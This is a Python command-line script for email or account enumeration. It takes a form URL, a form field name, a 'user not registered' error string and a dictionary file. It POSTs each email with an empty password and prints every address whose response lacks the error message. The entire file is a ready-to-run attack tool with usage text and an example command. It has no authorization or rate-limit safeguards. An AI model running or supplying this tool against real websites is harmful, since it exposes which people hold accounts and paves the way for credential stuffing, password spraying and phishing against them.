import requests
import sys
import getopt

arg_url = ""
arg_form = ""
arg_message = ""
arg_dict = ""
arg_help = """
A program that send the email provided in <dictionary> to a webserver with url <url> and check if the response text contains the error <message>.
If the error message is not found, means that the email belongs to a real user on the 
webserver; if that happens the script will show you the found email.

Usage: {0} -u <url> -f <form> -m <message> -d <dictionary>
OPTIONS:
    --url / -u: specify the post request url
    --form / -f: specify the email form value
    --message / -m: specify the message displayed when a user is not registered
    --dictionary / -d: specify the dictionary to use to search on

EXAMPLE:
    {0} -u "www.example.it/register" -f "email" -m "No user found" -d "email_dictionary"
""".format(
    sys.argv[0]
)

try:
    opts, args = getopt.getopt(
        sys.argv[1:], "hu:f:m:d:", ["help=", "url=", "form=", "message=", "dictionary="]
    )
except:
    print(arg_help)
    sys.exit(2)

for opt, arg in opts:
    if opt in ("-h", "--help"):
        print(arg_help)
        sys.exit(2)
    elif opt in ("-u", "--url"):
        arg_url = arg
    elif opt in ("-f", "--form"):
        arg_form = arg
    elif opt in ("-m", "--message"):
        arg_message = arg
    elif opt in ("-d", "--dictionary"):
        arg_dict = arg


email_file = open(arg_dict)
lines = email_file.readlines()
for email in lines:
    email = email.strip()
    payload = "{}={}&password=".format(arg_form, email)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    response = requests.post(arg_url, headers=headers, data=payload)
    if arg_message not in response.text:
        print("Found: {}".format(email))
